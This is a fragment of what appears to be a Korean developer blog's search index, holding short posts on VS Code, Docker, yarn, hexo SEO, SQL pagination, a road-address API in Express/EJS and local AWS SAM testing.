2 등 ctrl + 숫자 키로 코드 에디터에 포커스를 맞출 수 있다. 참고 switch-focus-between-editor-and-integrated-terminal-in-visual-studio-code","link":"/2020/11/18/vscode-%ED%84%B0%EB%AF%B8%EB%84%90-%EC%BD%94%EB%93%9C-%EC%97%90%EB%94%94%ED%84%B0-%ED%8F%AC%EC%BB%A4%EC%8A%A4-%EC%99%94%EB%8B%A4%EA%B0%94%EB%8B%A4%ED%95%98%EA%B8%B0/"},{"title":"vscode 항상 관리자 권한 실행하기","text":"관리자 권한이 필요한 상황이 있는데.. vscode를 항상 관리자 권한으로 실행해보자. 따라하기 윈도우키(검색창) &gt; code 검색 &gt; 우클릭 &gt; 파일 위치 열기 Visual Studio Code 바로가기를 우클릭 &gt; 속성 호환성탭 &gt; 모든 사용자에 대한 설정 변경 &gt; 관리자 권한으로 이 프로그램 실행 체크 &gt; 확인 &gt; 확인 이렇게하면 항상 관리자 권한 상태로 vscode가 실행된다. 사용자 게정 컨트롤 창 없애기 관리자 권한 실행으로 실행할때 나오는 사용자 계정 컨트롤 : 이 앱이 디바이스를 변경할 수 있도록 허용하시겠어요?까지 안나오게 해보자. 윈도우키(검색창) &gt; 사용자 게정 컨트롤 설정 변경 &gt; 알리지 않음 으로 설정 팁 vscode는 관리자권한이 아닌창이 켜져있을 때, 새로이 관리자권한으로 새 창(New Window)을 실행시킬 수 없다. 관리자권한으로 실행중인 vscode 창이 있을 때, 새로이 관리자권한이 아닌 새 창(New Window)을 실행시킬 수 없다. 즉, 처음에 관리자권한으로 실행시키면, 나중에 새로켜는 창은 모두 관리자 권한이여야 한다. 반대로 처음에 관리자권한이 아닌 기본권한으로 실행시키면, 나중에 새로켜는 창은 모두 관리자 권한이 아니다. (주의! : vscode 우클릭 관리자 권한 실행을 하더라도 기본권한으로 실행됨.) 그러므로 vscode 창 상단에 [Administrator] 표시가있는지 확인하자! 관리자권한으로 접근가능한 파일이 계속 접근이 안되서 뭐지 했는데, 이 문제였다.. 결국 켜져있는 모든 vscode창을 종료하고 새로이 관리자권한으로 실행시키니 관리자권한으로 켜졌다.","link":"/2020/10/15/vscode-%ED%95%AD%EC%83%81-%EA%B4%80%EB%A6%AC%EC%9E%90-%EA%B6%8C%ED%95%9C-%EC%8B%A4%ED%96%89%ED%95%98%EA%B8%B0/"},{"title":"vscode에서 마크다운 미리보기","text":"vscode에서 markdown open preview를 사용하면된다. markdown open preview ctrl shift v 를 누르면 마크다운 미리보기를 할 수 있다. 마크다운 미리보기창이 열리면 ctrl alt →키를 통해 옆으로 옮겨서 볼 수 있다. 실시간으로 반영되니 마크 다운 쓸때 엄청 유용하다!","link":"/2020/09/23/vscode%EC%97%90%EC%84%9C-%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4-%EB%AF%B8%EB%A6%AC%EB%B3%B4%EA%B8%B0/"},{"title":"web api location 객체","text":"12345678910111213141516{ ancestorOrigins: DOMStringList {length: 0} assign: ƒ assign() hash: &quot;&quot; host: &quot;chinsun9.github.io&quot; hostname: &quot;chinsun9.github.io&quot; href: &quot;https://chinsun9.github.io/keyboardevent.io/?time=1700&amp;a=123&quot; origin: &quot;https://chinsun9.github.io&quot; pathname: &quot;/keyboardevent.io/&quot; port: &quot;&quot; protocol: &quot;https:&quot; reload: ƒ reload() replace: ƒ replace() search: &quot;?time=1700&amp;a=123&quot; toString: ƒ toString()} 깃헙 페이지에서 쿼리스트링 파라미터를 어떻게 사용할 수 있을까하다가. https://chinsun9.github.io/keyboardevent.io?time=1700&amp;a=123 https://chinsun9.github.io/keyboardevent.io/?time=1700&amp;a=123 (이런 url로 리디렉트됨) 그래서 이 url의 값을 자바스크립트로 읽어서 쿼리스트링의 값에 따라 화면을 다르게 초기화할 수 있겠다라는 아이디어를 얻었다. url을 읽을때 location 객체에서 내가 원하는 부분은 search변수안에 들어있어서, 쉽게 꺼내 사용할 수 있을 것 같다. 참고 Location - Web API | MDN","link":"/2020/11/19/web-api-location-%EA%B0%9D%EC%B2%B4/"},{"title":"web font 적용하는 2가지 방법","text":"index.css1@import url(&quot;https://fonts.googleapis.com/css2?family=Nanum+Gothic&amp;display=swap&quot;); index.html1234&lt;link href=&quot;https://fonts.googleapis.com/css2?family=Nanum+Gothic&amp;display=swap&quot; rel=&quot;stylesheet&quot;/&gt; link태그로 불러오는 것은 기존에 알고 있었는데, css에서 @import 로 불러오는 것은 처음알았다. 폰트같이 범용적은 것은 index.css에 넣어주면 좋을 것 같다. 참고 https://developer.mozilla.org/ko/docs/Web/CSS/@import","link":"/2020/12/16/web-font-%EC%A0%81%EC%9A%A9%ED%95%98%EB%8A%94-2%EA%B0%80%EC%A7%80-%EB%B0%A9%EB%B2%95/"},{"title":"web 카테고리 생성","text":"web","link":"/2020/09/18/web-%EC%B9%B4%ED%85%8C%EA%B3%A0%EB%A6%AC-%EC%83%9D%EC%84%B1/"},{"title":"windows10 home에서 docker 설치하기","text":"2020-09-21 기준 windows10 home도 버전 2004로 업데이트하면 가능 bios에서 가상화 설정 wsl 활성화 설치하기 먼저 자신의 윈도우 버전을 확인합니다 win + R 키로 실행창 여시고 winver 실행 2004 버전이 아니라면! 윈도우 업데이트를 열어서 2004 버전 업데이트를 해줍니다 시간이 쫌 걸린다 이제 BIOS에서 가상화 설정을 활성화를 해줍니다 asus bios 기준 ; 고급 &gt; cpu &gt; 가상화 기술 enable wsl 기능을 활성화한다 (재부팅 필요) https://hub.docker.com/editions/community/docker-ce-desktop-windows/ docker 인스톨러 다운받기, get stable 클릭해서 받는다 인스톨러를 실행한다 끝","link":"/2020/09/21/windows10-home%EC%97%90%EC%84%9C-docker-%EC%84%A4%EC%B9%98%ED%95%98%EA%B8%B0/"},{"title":"윈도우에서 yarn 설치","text":"nodejs로 이것저것할 때 yarn을 피해갈 수 없을 것이다. 설치방법 https://classic.yarnpkg.com/ &gt; install yarn &gt; download installer https://classic.yarnpkg.com/en/docs/install#windows-stable 인스톨러를 받고 실행하면 끝 설치가 완료되면 cmd를 열고 yarn -v 를 쳐서 확인한다. yarn 페이스북에서 만든 npm 참고 yarn","link":"/2020/11/25/yarn-%EC%84%A4%EC%B9%98/"},{"title":"가장 큰 정사각형 찾기","text":"12345678910111213141516171819202122232425262728293031323334353637// https://programmers.co.kr/learn/courses/30/lessons/12905// 가장 큰 정사각형 찾기function solution(board) { var answer = 1; var lownum = board.length; var colnum = board[0].length; console.log(lownum, colnum); if (lownum == 1 || colnum == 1) { var maxRow = board.map(function (row) { return Math.max.apply(null, row); }); var max = Math.max.apply(null, maxRow); return max; } var max = 0; for (var q = 1; q &lt; board.length; q++) { for (var w = 1; w &lt; board[0].length; w++) { if (board[q][w] == 0) { continue; } var arr = [board[q - 1][w - 1], board[q - 1][w], board[q][w - 1]]; board[q][w] = Math.min.apply(null, arr) + 1; max = Math.max(max, board[q][w]); } } answer = max * max; // console.log(maxRow, max); console.log(answer); return answer;} 해설 2차원 배열이 입력으로 들어온다 2차월 연속된 1 이 이루는 가장 큰 정사각형의 넓이를 반환해야 한다 먼저 입력된 보드가 행과 열 어느 하나가 1인 경우 1또는 0을 반환한다. 이제 1이 아닌 경우에 복잡해 지는데.. 0과 1로만 이루어진 보드를 갱신해 나갈거다. board[1][1] 부터 시작해서 이전 3개를 살펴볼것이다. 이때 board[1][1]이 0 이면 패스한다. 1이면 ㄱㄱ 위, 왼쪽, 왼쪽 대각선위를 살펴서 가장 작은 숫자를 찾는다. 그런다음에 board[1][1]에 가장 작은 숫자 + 1을 대입한다 board[1][2] 로 이동해서 같은 것을 반복한다. 그림으로 보면 이렇다. step1] board[1][1] 일때 step1] board[1][2] 일때 반복… 결과] 위 처럼 계속 갱신하고 보드에 마지막에 도달하면 끝이 난다 이후에 board 내에서 가장 높은 숫자를 찾는다. 그러면 3이라는 숫자를 얻을 수 있다. 넓이를 반환하고 했으니까 3*3 해서 9를 반환하면 된다.","link":"/2020/09/18/%EA%B0%80%EC%9E%A5-%ED%81%B0-%EC%A0%95%EC%82%AC%EA%B0%81%ED%98%95-%EC%B0%BE%EA%B8%B0/"},{"title":"chrome 강력 새로고침","text":"웹을 수정할때 가끔 브라우저 캐시때문에 원하는 모양이 안나오는 경우가 있다. 강력 새로고침하는 법 F12로 크롬 개발자 도구창을 킨다. 브라우저 상단 새로고침 아이콘에 우클릭을하면 3개의 새로고침 메뉴가 나온다. (개발자 도구창이 안켜져있으면 안나옴) 그밖에도 단축키를 이용하는 방법이 있다.","link":"/2020/10/14/%EA%B0%95%EB%A0%A5-%EC%83%88%EB%A1%9C%EA%B3%A0%EC%B9%A8/"},{"title":"게시판 페이지네이션 SQL","text":"sql123456const page = 1;const query = `SELECT * FROM notice WHERE use_flag='Y' ORDER BY idx DESC LIMIT ?,?`;const queryArgs = [10 * (page - 1), 10];return client.query(query, queryArgs); notice 테이블에서 page값에 따라 게시글 10개를 가져오는 쿼리이다 limit 을 이용해서 구현하였다. SELECT * FROM notice LIMIT 0,10// 0번째부터 10개를 가져온다는 의미이다. SELECT * FROM notice LIMIT 20,10// 20번째부터 10개를 가져온다는 의미이다. 참고 web test에서 사용한 소스코드","link":"/2020/11/09/%EA%B2%8C%EC%8B%9C%ED%8C%90-%ED%8E%98%EC%9D%B4%EC%A7%80%EB%84%A4%EC%9D%B4%EC%85%98-SQL/"},{"title":"글마다 썸네일 넣기","text":"글마다 썸네일 넣는법! thumbnail: 이미지 경로 12345678910---title: 글마다 썸네일 넣기date: 2020-09-17 13:21:23category: blogtags: - hexo - thumbnailthumbnail: /images/글마다-썸네일-넣기20200917/미리보기.jpg--- 주의사항1&lt;img src=&quot;/images\\글마다-썸네일-넣기20200917\\photo_2020-09-17_13-22-16.jpg&quot; &gt; 포스팅할때 내용에 저런식으로 /와 \\를 혼용해도 정상작동했다.. 그래서 썸네일 지정도 그러할 줄 알았더니… 1thumbnail: /images\\글마다-썸네일-넣기20200917\\미리보기.jpg 이렇게 넣으면 작동을 안한다. 이렇게.. 1thumbnail: /images/글마다-썸네일-넣기20200917/photo_2020-09-17_13-22-16.jpg 이렇게 /로 다 치환해줘야 썸네일 이미지가 제대로 들어간다.","link":"/2020/09/17/%EA%B8%80%EB%A7%88%EB%8B%A4-%EC%8D%B8%EB%84%A4%EC%9D%BC-%EB%84%A3%EA%B8%B0/"},{"title":"깃허브 자기 닉네임 저장소 special repository","text":"https://github.com/chinsun9 자기 깃허브 메인화면에 가장 처음 표시되는 readme파일의 저장소다! 내가 어떤 개발자인지 보여주는 용도이다. GitHub Readme Stats를 통해 자기 깃허브 활동을 시각적으로 보여주면 더 좋다! special repository github에서 저장소명을 자신의 닉네임이랑 똑같이 하면 special repository 라는 것이 만들어진다. 이 special repository는 내 깃허브 메인 화면에서 가장 처음으로 보여지는데, 여기서 내 프로필을 적어서 나를 자랑?할 수 있다. GitHub Readme Stats https://github-readme-stats.vercel.app/api?username={내 깃허브닉네임} https://github-readme-stats.vercel.app/api/top-langs/?username={내 깃허브닉네임} 아무 설치없이 간단하게 내 깃허브 활동 통계를 볼 수 있다..! chinsung/chinsung https://github.com/chinsun9/chinsun9","link":"/2020/10/30/%EA%B9%83%ED%97%88%EB%B8%8C-%EC%9E%90%EA%B8%B0-%EB%8B%89%EB%84%A4%EC%9E%84-%EC%A0%80%EC%9E%A5%EC%86%8C/"},{"title":"내 github blog 글이 구글 검색에 나오는 법","text":"깃허브 블로그는 네이버 블로그와 같이 자동으로 검색엔진을 통해 검색되지 않는다! 내가 쓴 글이 구글 검색에 노출되려면 설정을 해줘야한다! 따라하기 hexo icarus theme (react) 기준입니다! Hexo SEO - 하루 만에 검색 엔진 최적화 시키기 | Seongho’s Dev Story를 참고하였다 SEO 설정 seo, search engine optimization cmd1234npm i hexo-autonofollownpm i hexo-generator-feednpm i hexo-generator-seo-friendly-sitemapnpm i hexo-generator-robotstxt hexo에서 seo 관련 플러그인이 있는데 설치한다. 참고 ; 다른 seo관련 글에서는 hexo-auto-canonical을 설치하라고 하는데 react로 되어있는 최신버전의 icarus 테마에서는 표준링크을 자동으로 생성한다. 그래서 설치하지 않아도 된다! _config.yml1234567891011121314151617181920212223deploy: type: git repo: 'https://github.com/chinsun9/chinsun9.github.io' branch: master# 새로 추가nofollow: enable: true exclude: - exclude1.com - exclude2.comfeed: type: rss2 path: rss2.xml limit: 20sitemap: path: sitemap.xml tag: false category: falserobotstxt: useragent: '*' allow: - / sitemap: https://chinsun9.github.io/sitemap.xml _config.yml 최 하단에 deploy 설정 밑에 새로 추가한다. sitemap: https://여러분의깃헙유저네임.github.io/sitemap.xml 주의! 나는 위 과정에서 hexo-component-inferno 패키지를 설치하라고 해서 설치했다. 또 패키지 4개를 설치하면서 warn 경고 메시지가 자꾸 출력되는데 나는 무시했다. 여기까지 했다면 hexo d -g명령으로 배포한다. 참고 ; hexo d -g는 hexo deploy --generate명령과 동일하다. 참고 ; hexo deploy --generate는 hexo generate &amp; hexo deploy와 동일하다. 그러면 public 디렉터리에 rss2.xml, sitemap.xml, robots.txt 이 3개의 파일이 보이면 성공이다. 검색 엔진 등록하기구글 구글 서치 콘솔로 이동하여 시작하기를 누른다. URL 접두어를 선택하고, 자신의 깃헙 주소를 입력하고 계속한다. 소유권 확인 과정이 있는데, html 파일을 다운받고, hexo 디렉터리에서 public 디렉터리 밑에 다운받은 파일을 위치시키고 hexo d하려 배포한다. 잠시 기다렸다가 확인버튼을 누른다. 소유권이 확인되면 속성으로 이동 버튼을 누른다. sitemaps 메뉴를 클릭한다 2-1. 사이트맵 URL 입력에 sitemap.xml을 입력하고 제출 버튼을 누른다. 2-2. 사이트맵 URL 입력에 rss2.xml을 입력하고 제출 버튼을 누른다. 상태에 보면 성공이 아닐 수도 있는데 새로고침 해보면 성공으로 보일 것이다. 하루정도? 지나면 구글에서 내 글을 검색할 수 있다! 네이버 네이버도 구글과 비슷하므로 간단하게 넘어간다. 네이버 웹마스터 도구에 들어간다. 사이트 등록에 내 깃헙 블로그 주소를 입력하면 소유권확인 과정이 나온다 구글과 똑같이 html파일을 다운받고 public 디렉터리에 파일을 옮기고 hexo d하여 갱신한다. 왼쪽 메뉴를 보면 요청 &gt; rss제출로 들어가 자신의 rss2.xml 주소를 입력하고 확인버튼을 누른다. 요청 &gt; 사이트맵 제출로 들어가 sitemap.xml을 입력하고 확인버튼을 누른다. 네이버 등록도 끝이 났다! 다음 다음은 약간 다르다 다음 검색등록에 들어간다. 신규등록하기 버튼을 누른다 약관에 동의한다. 폼을 작성한다. * 마크가 붙어있는 것은 필수 항목이다. 심사가 끝나면 이메일로 알려준다고 하니 기다리자.. 여기까지 다음 등록도 끝났다! 팁언제부터 검색이 될까..? 검색 엔진에 등록하면 바로 검색 노출은 안되고, 시간이 필요하다. 하루 정도 걸린다고 생각하자. 표준링크 확인하기 hexo-auto-canonical를 설치하지 않아도 된다고 했는데, 알아보니까 자동으로 생성해주고 있었다! 확인하는 방법은.. 내 블로그에서 아무 글이나 클릭해서 들어간다. F12로 개발자도구를 연다. ctrl f 로 검색창을 연다음에 canonical를 검색한다. 그러면 위와같은 link 태그가 있으면 된다!","link":"/2020/09/23/%EB%82%B4-github-blog-%EA%B8%80%EC%9D%B4-%EA%B5%AC%EA%B8%80-%EA%B2%80%EC%83%89%EC%97%90-%EB%82%98%EC%98%A4%EB%8A%94-%EB%B2%95/"},{"title":"내가 css를 작성하면서 많이 사용하는 줄임말, 스니펫?","text":"12345678910.example { /* df */ display: flex; /* jcc */ justify-content: center; /* aic */ align-items: center;} 짧게 쓰고 자동완성 시킨다 자동완성 시키고 ctrl + enter 로 새로운 라인으로 이동하여 이어서 작성한다","link":"/2020/12/15/%EB%82%B4%EA%B0%80-css%EB%A5%BC-%EC%9E%91%EC%84%B1%ED%95%98%EB%A9%B4%EC%84%9C-%EB%A7%8E%EC%9D%B4-%EC%82%AC%EC%9A%A9%ED%95%98%EB%8A%94-%EC%A4%84%EC%9E%84%EB%A7%90-%EC%8A%A4%EB%8B%88%ED%8E%AB/"},{"title":"내가 블로그에서 마크다운 쓰는법","text":"포스트.md12345678910111213141516171819&lt;img src=&quot;https://chinsun9.github.io/img/avatar.png&quot; &gt;- 상세 설명1- 상세 설명2## h2- 그러하다### h3- 그러하다- 종종 [링크](https://chinsun9.github.io/img/avatar.png)## 코드 스니펫```js tmp.jsconsole.log(hi);``` 나는 블로그에 글 쓸때 이렇게만 쓴다. 위 처럼 작성하면 결과는… 상세 설명1 상세 설명2 h2 그러하다 h3 그러하다 종종 링크 코드 스니펫tmp.js1console.log(hi);","link":"/2020/09/22/%EB%82%B4%EA%B0%80-%EB%B8%94%EB%A1%9C%EA%B7%B8%EC%97%90%EC%84%9C-%EB%A7%88%ED%81%AC%EB%8B%A4%EC%9A%B4-%EC%93%B0%EB%8A%94%EB%B2%95/"},{"title":"내가 싫어하는 것","text":"싫어하는 것 싫어하는 것 -&gt; 선호하는 것 글자 읽기 : 3줄이상 빼곡히 붙어있는 글자 -&gt; 이미지, 동영상, 오디오 흥미 없는 것 자료조사 또는 공부 -&gt; 관심있는 것 조사 이론 -&gt; 실기 ~하기위한 방법/절차/이론/개념 -&gt; ~을 했을때 결과 예제 좋아하는 것 단순한 것","link":"/2020/10/20/%EB%82%B4%EA%B0%80-%EC%8B%AB%EC%96%B4%ED%95%98%EB%8A%94-%EA%B2%83/"},{"title":"EJS, node express에서 도로명주소 api 사용하기","text":"nodejs express ejs로 웹을 만드는데 도로명 주소 api를 사용하게됬다. 예제가 jsp밖에없어서 헤맸는데.. 따라하기 이미지가 먼저 나오고 설명은 이미지 아래 적습니다! ejs에서 도로명주소 api를 사용하는 법! 간단한 express 프로젝트로 해보자! 준비물 vscode nodejs 도로명 주소 api 키 발급받기 도로명 주소 api 신청하기 신청폼을 작성한다. 서비스폼은 개발로 선택하면 별도 인증없이 발급받을 수 있다. 공부할때 딱이다! 신청 버튼을 누르고 나면, 빨간색 폰트로 승인키가 보일것이다. 승인키를 복사하여 메모해둔다! express generator로 프로젝트 생성 여기부터 vscode을 열고 작업합니다. cmd1npm i express-generator -g express-generator를 전역설치한다. cmd1express juso-api-practice --view=ejs cmd log12345678change directory: &gt; cd juso-api-practiceinstall dependencies: &gt; npm installrun the app: &gt; SET DEBUG=juso-api-practice:* &amp; npm start 이런 메시지가 나오면 성공한거다 메시지 대로 수행해보자 cmd123cd juso-api-practicenpm iSET DEBUG=juso-api-practice:* &amp; npm start cmd log123456C:\\tmp\\juso-api-practice&gt;SET DEBUG=juso-api-practice:* &amp; npm start&gt; juso-api-practice@0.0.0 start C:\\tmp\\juso-api-practice&gt; node ./bin/www juso-api-practice:server Listening on port 3000 +0ms 여기까지 되면 http://localhost:3000/ 에 접속해서 잘 실행되는지 확인한다. 주소 입력할 폼 만들기 jsp 소스를 참고하여 만들었다. view/index.ejs123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;&lt;%= title %&gt;&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;/stylesheets/style.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;&lt;%= title %&gt;&lt;/h1&gt; &lt;p&gt;Welcome to &lt;%= title %&gt;&lt;/p&gt; &lt;div&gt; &lt;form name=&quot;form&quot;&gt; &lt;input name=&quot;roadAddrPart1&quot; type=&quot;text&quot; placeholder=&quot;도로명주소&quot; /&gt; &lt;input name=&quot;addrDetail&quot; type=&quot;text&quot; placeholder=&quot;고객입력 상세주소&quot; /&gt; &lt;input name=&quot;zipNo&quot; type=&quot;text&quot; placeholder=&quot;우편번호&quot; /&gt; &lt;input type=&quot;button&quot; value=&quot;주소검색&quot; onclick=&quot;goPopup()&quot; /&gt; &lt;/form&gt; &lt;/div&gt; &lt;script language=&quot;javascript&quot;&gt; function goPopup() { var pop = window.open( '/popup/jusoPopup', 'pop', 'width=570,height=420, scrollbars=yes, resizable=yes' ); } function jusoCallBack( roadFullAddr, roadAddrPart1, addrDetail, roadAddrPart2, engAddr, jibunAddr, zipNo, admCd, rnMgtSn, bdMgtSn, detBdNmList, bdNm, bdKdcd, siNm, sggNm, emdNm, liNm, rn, udrtYn, buldMnnm, buldSlno, mtYn, lnbrMnnm, lnbrSlno, emdNo ) { // 팝업페이지에서 주소입력한 정보를 받아서, 현 페이지에 정보를 등록합니다. document.form.roadAddrPart1.value = roadAddrPart1; document.form.addrDetail.value = addrDetail; document.form.zipNo.value = zipNo; } &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; view/index.ejs를 위 소스로 덮어쓴다. 이제 새로운 view파일을 만든다. 도로명 주소 검색 팝업용 view파일 생성view/jusoPopup.ejs1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot; &quot;http://www.w3.org/TR/html4/loose.dtd&quot;&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt; &lt;title&gt;Insert title here&lt;/title&gt; &lt;% const { inputYn, roadFullAddr, roadAddrPart1, roadAddrPart2, engAddr, jibunAddr, zipNo, addrDetail, admCd, rnMgtSn, bdMgtSn, detBdNmList, bdNm, bdKdcd, sggNm, emdNm, rn, udrtYn, buldMnnm, buldSlno, mtYn, lnbrMnnm, lnbrSlno, emdNo, siNm, liNm, } = locals; %&gt; &lt;/head&gt; &lt;script language=&quot;javascript&quot;&gt; // document.domain = 'localhost'; function init() { var url = location.href; var confmKey = 'devU01TX0FVVEgyMDIwMDkyMzE0NDY0NjExMDIyNDQ='; var resultType = '4'; // 도로명주소 검색결과 화면 출력내용, 1 : 도로명, 2 : 도로명+지번, 3 : 도로명+상세건물명, 4 : 도로명+지번+상세건물명 var inputYn = '&lt;%=inputYn%&gt;'; if (inputYn != 'Y') { document.form.confmKey.value = confmKey; document.form.returnUrl.value = url; document.form.resultType.value = resultType; document.form.action = 'http://www.juso.go.kr/addrlink/addrLinkUrl.do'; //인터넷망 //document.form.action=&quot;http://www.juso.go.kr/addrlink/addrMobileLinkUrl.do&quot;; //모바일 웹인 경우, 인터넷망 document.form.submit(); } else { opener.jusoCallBack( '&lt;%=roadFullAddr%&gt;', '&lt;%=roadAddrPart1%&gt;', '&lt;%=addrDetail%&gt;', '&lt;%=roadAddrPart2%&gt;', '&lt;%=engAddr%&gt;', '&lt;%=jibunAddr%&gt;', '&lt;%=zipNo%&gt;', '&lt;%=admCd%&gt;', '&lt;%=rnMgtSn%&gt;', '&lt;%=bdMgtSn%&gt;', '&lt;%=detBdNmList%&gt;', '&lt;%=bdNm%&gt;', '&lt;%=bdKdcd%&gt;', '&lt;%=siNm%&gt;', '&lt;%=sggNm%&gt;', '&lt;%=emdNm%&gt;', '&lt;%=liNm%&gt;', '&lt;%=rn%&gt;', '&lt;%=udrtYn%&gt;', '&lt;%=buldMnnm%&gt;', '&lt;%=buldSlno%&gt;', '&lt;%=mtYn%&gt;', '&lt;%=lnbrMnnm%&gt;', '&lt;%=lnbrSlno%&gt;', '&lt;%=emdNo%&gt;' ); window.close(); } } &lt;/script&gt; &lt;body onload=&quot;init();&quot;&gt; &lt;form id=&quot;form&quot; name=&quot;form&quot; method=&quot;post&quot;&gt; &lt;input type=&quot;hidden&quot; id=&quot;confmKey&quot; name=&quot;confmKey&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; id=&quot;returnUrl&quot; name=&quot;returnUrl&quot; value=&quot;&quot; /&gt; &lt;input type=&quot;hidden&quot; id=&quot;resultType&quot; name=&quot;resultType&quot; value=&quot;&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 이 jusoPopup.ejs 가 index view에서 버튼을 누르면 등장하는 팝업이다. view/jusoPopup.ejs 이름으로 만든다 이제 라우터를 수정하자 api가 잘 동작하도록 라우터 수정routes/index.js123456789101112131415161718var express = require('express');var router = express.Router();/* GET home page. */router.get('/', function (req, res, next) { res.render('index', { title: 'Express' });});router.get('/popup/jusoPopup', (req, res) =&gt; { res.render('jusoPopup');});router.post('/popup/jusoPopup', (req, res) =&gt; { res.locals = req.body; res.render('jusoPopup');});module.exports = router; routes/index.js를 위 소스로 덮어쓴다. /popup/jusoPopup 라우트를 추가해줬다. 동작 구조 설명 그림으로 표현해봤다.. 그리고보니 엄청 더럽네.. jusoPopup.ejs는 2가지 일을하는 놈이다. 도로명주소 검색창을 보여주거나, 입력폼으로 도로명주소 결과를 전달한다. inputYn 이라는 변수가 있는데, 이 변수에 따라 동작 여부가 갈린다. index화면에서 주소검색 버튼을 눌러 켜면 get으로 주소팝업을 불러온다. 그러면 inputYn 변수가 초기화 되지 않아있다. http://www.juso.go.kr/addrlink/addrLinkUrl.do 로 자동으로 도로명주소 api를 통해 검색화면을 불러온다. 사용자가 검색화면에서 검색어를 입력하면 http://www.juso.go.kr/addrlink/addrLinkUrlSearch.do 로 도로명주소 api를 통해 검색결과를 받아온다. 결과중 하나를 선택하고 상세주소를 입력하고 마지막으로 주소입력 버튼을 누르면, post로 주소팝업을 불러온다. 이때 검색결과를 같이 넘긴다. post로 주소팝업을 부르면 라우터에서는 수신받은 검색결과를 다시 리스폰객체에 담아서 보내준다. 그러면 inputYn 변수가 초기화 되어있다. inputYn가 Y 일때, 부모창(index.ejs)에 jusoCallBack()함수를 실행시키는데, 이때 인자로 검색결과를 넘기는 것이다. 그러면 index.ejs의 jusoCallBack()에서 검색결과값을 가지고 인풋을 덮었는 것이다. 여기까지 프로젝트 소스참고 도로명주소api를 활용한 웹 프로젝트","link":"/2020/09/23/%EB%8F%84%EB%A1%9C%EB%AA%85%EC%A3%BC%EC%86%8C-api-%EC%82%AC%EC%9A%A9%ED%95%98%EA%B8%B0/"},{"title":"도커 메모리 차지","text":"윽… 도커를 쓰다보면 메모리가 부족해서 마우스가 끊기고 막 그런다… 참고로 나는 윈도우에 8GB램을 쓰고잇다.. 참고 WSL2 기반 docker 사용시 vmmem 프로세스 메모리 소모량 줄이기","link":"/2020/10/16/%EB%8F%84%EC%BB%A4-%EB%A9%94%EB%AA%A8%EB%A6%AC-%EC%B0%A8%EC%A7%80/"},{"title":"도커 실행 명령어","text":"1sudo service docker start sudo service docker start ec2 리눅스에서 도커 실행할때 주로 쓴다 윈도우에서는 그냥 docker desktop을 실행시킨다","link":"/2020/10/23/%EB%8F%84%EC%BB%A4-%EC%8B%A4%ED%96%89-%EB%AA%85%EB%A0%B9%EC%96%B4/"},{"title":"두 값 사이의 난수 생성하기","text":"123function getRandomArbitrary(min, max) { return Math.random() * (max - min) + min;} mdn에 여러가지 조건의 난수를 생성하는 좋은 예제가 있다 참고 https://developer.mozilla.org/ko/docs/Web/JavaScript/Reference/Global_Objects/Math/random#%EB%91%90_%EA%B0%92_%EC%82%AC%EC%9D%B4%EC%9D%98_%EB%82%9C%EC%88%98_%EC%83%9D%EC%84%B1%ED%95%98%EA%B8%B0","link":"/2021/01/05/%EB%91%90-%EA%B0%92-%EC%82%AC%EC%9D%B4%EC%9D%98-%EB%82%9C%EC%88%98-%EC%83%9D%EC%84%B1%ED%95%98%EA%B8%B0/"},{"title":"로컬에서 sam 테스트하기","text":"이제 테스트할 때 build, deploy 기다리기… 할 필요가 없다! 전제조건 docker 설치 참고 ; windows10 home에서 docker 설치하기 지난번에 만든 hello-world sam project에서 테스트해보자 sam local start-apicmd1sam local start-api --skip-pull-image cmd log123456789101112131415161718C:\\tmp\\hello-world&gt;sam local start-api --skip-pull-imageMounting HelloWorldFunction at http://127.0.0.1:3000/hello [GET]You can now browse to the above endpoints to invoke your functions. You do not need to restart/reload SAM CLI while working on your functions, changes will be reflected instantly/automatically. You only need to restart SAMCLI if you update your AWS SAM template2020-09-21 13:40:36 * Running on http://127.0.0.1:3000/ (Press CTRL+C to quit)2020-09-21 13:40:41 127.0.0.1 - - [21/Sep/2020 13:40:41] &quot;GET / HTTP/1.1&quot; 403 -2020-09-21 13:40:41 127.0.0.1 - - [21/Sep/2020 13:40:41] &quot;GET /favicon.ico HTTP/1.1&quot; 403 -Invoking app.lambdaHandler (nodejs12.x)Requested to skip pulling images ...Mounting C:\\tmp\\hello-world\\.aws-sam\\build\\HelloWorldFunction as /var/task:ro,delegated inside runtime containerSTART RequestId: 00b5b190-1c8d-184f-5ab5-c0e0764041d3 Version: $LATESTEND RequestId: 00b5b190-1c8d-184f-5ab5-c0e0764041d3REPORT RequestId: 00b5b190-1c8d-184f-5ab5-c0e0764041d3 Init Duration: 438.88 msDuration: 4.53 ms Billed Duration: 100 ms Memory Size: 128 MB Max Memory Used: 44 MBNo Content-Type given. Defaulting to 'application/json'.2020-09-21 13:40:48 127.0.0.1 - - [21/Sep/2020 13:40:48] &quot;GET /hello HTTP/1.1&quot; 200 -2020-09-21 13:40:48 127.0.0.1 - - [21/Sep/2020 13:40:48] &quot;GET /favicon.ico HTTP/1.1&quot; 403 - 나는 이렇게 명령을 쓴다. 나는 보통 매 실행마다 3-4초 정도 걸린다. build, deploy 하면서 테스트할때보다 획기적으로 빠르게 로컬에서 테스트 해볼 수 있다. --skip-pull-image옵션을 주는 이유는 매 실행마다 이미지를 받아오는 과정이 있는게 그걸 스킵하면 2초정도 빨라진다. 변경 사항은 자동으로 반영된다. 단점 ; 근데 변경사항이 없어도 매 실행 3초이상 걸린다. template.yaml 파일을 수정하면 수동으로 재시작 해줘야한다.","link":"/2020/09/21/%EB%A1%9C%EC%BB%AC%EC%97%90%EC%84%9C-sam-%ED%85%8C%EC%8A%A4%ED%8A%B8%ED%95%98%EA%B8%B0/"},{"title":"리눅스 